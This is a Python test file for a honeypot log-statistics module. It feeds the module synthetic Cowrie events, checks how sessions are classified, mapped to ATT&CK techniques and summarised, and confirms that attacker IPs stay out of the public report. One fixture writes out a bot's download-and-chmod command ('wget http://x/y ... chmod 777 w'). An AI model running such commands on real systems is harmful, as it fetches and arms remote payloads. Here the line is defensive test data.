"""Tests for stats.py, using synthetic Cowrie events.

All IPs are from the reserved documentation ranges (RFC 5737), never real attacker data.
"""

import json

import stats

SCANNER, BRUTER, BOT, ME = "203.0.113.1", "203.0.113.2", "203.0.113.3", "198.51.100.9"


def ev(session, ip, eventid, ts="2026-11-06T03:18:55Z", **extra):
    return {"session": session, "src_ip": ip, "eventid": eventid, "timestamp": ts,
            "protocol": extra.pop("protocol", "telnet"), "uuid": "same-sensor-id", **extra}


def write_log(tmp_path, events, name="cowrie.json", extra_lines=()):
    lines = [json.dumps(e) for e in events] + list(extra_lines)
    (tmp_path / name).write_text("\n".join(lines) + "\n", encoding="utf-8")


def sample_events():
    events = [ev("s1", SCANNER, "cowrie.session.connect", protocol="ssh")]
    events += [ev("s2", BRUTER, "cowrie.login.failed", username="root", password=f"pw{i}")
               for i in range(6)]
    events += [
        ev("s3", BOT, "cowrie.login.success", username="admin", password="admin"),
        ev("s3", BOT, "cowrie.command.input", input="cat /proc/self/exe"),
        ev("s3", BOT, "cowrie.command.input", input="wget http://x/y -O- > w; chmod 777 w"),
        ev("s3", BOT, "cowrie.session.file_download", url="http://x/y", shasum="ab" * 32),
        ev("s4", BOT, "cowrie.login.success", username="admin", password="admin"),
        ev("s5", ME, "cowrie.login.success", username="test", password="test"),
    ]
    return events


def sessions_from(tmp_path, own_ips=frozenset({ME})):
    write_log(tmp_path, sample_events())
    return stats.load_sessions(tmp_path, set(own_ips))


# ---------------------------------------------------------------- parsing

def test_own_ips_are_excluded(tmp_path):
    sessions = sessions_from(tmp_path)
    assert ME not in {s["ip"] for s in sessions.values()}
    assert len(sessions) == 4


def test_dedupes_lines_across_rotated_files_despite_shared_uuid(tmp_path):
    events = sample_events()
    write_log(tmp_path, events)
    write_log(tmp_path, events, name="cowrie.json.2026-11-06")  # same lines in a rotated copy
    sessions = stats.load_sessions(tmp_path, {ME})
    assert sessions["s2"]["failed_logins"] == 6  # not 12, and not 1 (uuid is the same everywhere)


def test_skips_malformed_and_non_object_lines(tmp_path):
    write_log(tmp_path, sample_events(), extra_lines=['{"truncated": ', "[1, 2]", "42"])
    assert len(stats.load_sessions(tmp_path, {ME})) == 4


# ---------------------------------------------------------------- classification

def test_tiers(tmp_path):
    s = sessions_from(tmp_path)
    assert [stats.tier(s[k]) for k in ("s1", "s2", "s3", "s4")] == \
        ["scan", "login-attempt", "hands-on", "access"]


def test_brute_force_needs_threshold(tmp_path):
    s = sessions_from(tmp_path)
    brute = stats.brute_force_ips(s)
    assert BRUTER in brute  # 6 failures >= 5
    one_failure = {"x": {**s["s2"], "ip": "203.0.113.50", "failed_logins": 1}}
    assert stats.brute_force_ips(one_failure) == set()


def test_attack_mapping(tmp_path):
    s = sessions_from(tmp_path)
    brute = stats.brute_force_ips(s)
    assert "T1110 Brute Force" in stats.techniques(s["s2"], brute)
    bot = stats.techniques(s["s3"], brute)
    assert {"T1078 Valid Accounts", "T1059.004 Unix Shell", "T1082 System Information Discovery",
            "T1105 Ingress Tool Transfer", "T1222.002 Linux File Permissions Modification"} <= bot
    assert "T1110 Brute Force" not in bot
    assert stats.techniques(s["s1"], brute) == set()  # a scan maps to nothing


def test_attack_rules_avoid_obvious_false_positives():
    quiet = {"ip": "203.0.113.9", "login_ok": True, "failed_logins": 0,
             "commands": ["echo unamed", "ls -la /tmp/curly"]}
    found = stats.techniques(quiet, set())
    assert "T1082 System Information Discovery" not in found
    assert "T1105 Ingress Tool Transfer" not in found


# ---------------------------------------------------------------- metrics & outputs

def test_summary_counts(tmp_path):
    m = stats.summarize(sessions_from(tmp_path), geo={BOT: "Testland", BRUTER: "Exampleland"},
                        today="2026-11-06")
    assert m["connections"] == 4 and m["scans"] == 1
    assert m["attacker_sessions"] == 3 and m["attacker_ips"] == 2
    assert m["hands_on"] == 1 and m["logins_ok"] == 2
    assert m["samples"] == 1 and m["countries"] == 2


def test_history_replaces_same_day_and_keeps_old_schema(tmp_path):
    path = tmp_path / "history.csv"
    path.write_text("date,days,sessions\n2026-11-05,1,8\n", encoding="utf-8")
    m = stats.summarize(sessions_from(tmp_path), geo={}, today="2026-11-06")
    stats.update_history(m, path)
    rows = stats.update_history(m, path)  # second run, same day
    assert [r["date"] for r in rows] == ["2026-11-05", "2026-11-06"]


def test_is_stale():
    rows = [{"connections": "10"}, {"connections": "10"}, {"connections": "10"}]
    assert stats.is_stale(rows, days=2)
    assert not stats.is_stale(rows[:2], days=2)  # not enough history yet
    assert not stats.is_stale([{"connections": "9"}, *rows[1:]], days=2)


def test_clean_neutralizes_markdown_and_newlines():
    out = stats.clean("a|b`c[[x]]<script>\n# head")
    for bad in "|`[]<>\n#":
        assert bad not in out
    assert stats.clean("x" * 200, limit=10).endswith("…")


def test_alert_adds_one_todo_item_per_day(tmp_path, monkeypatch):
    monkeypatch.setattr(stats, "RUN_LOG", tmp_path / "runs.log")
    (tmp_path / "todo.md").write_text("# Todo\n", encoding="utf-8")
    cfg = stats.Config(host="h", own_ips=set(), log_dir=tmp_path, vault_dir=tmp_path, key="k")
    stats.alert(cfg, "VM unreachable")
    stats.alert(cfg, "VM unreachable")  # same alert again the same day
    todo = (tmp_path / "todo.md").read_text(encoding="utf-8")
    assert todo.count("VM unreachable") == 1
    assert "ALERT VM unreachable" in (tmp_path / "runs.log").read_text(encoding="utf-8")


def test_public_readme_block_has_no_attacker_ips(tmp_path):
    m = stats.summarize(sessions_from(tmp_path), geo={}, today="2026-11-06")
    block = stats.render_public(m, [{"date": "2026-11-06", "attacker_sessions": "3"}])
    for ip in (SCANNER, BRUTER, BOT, ME):
        assert ip not in block
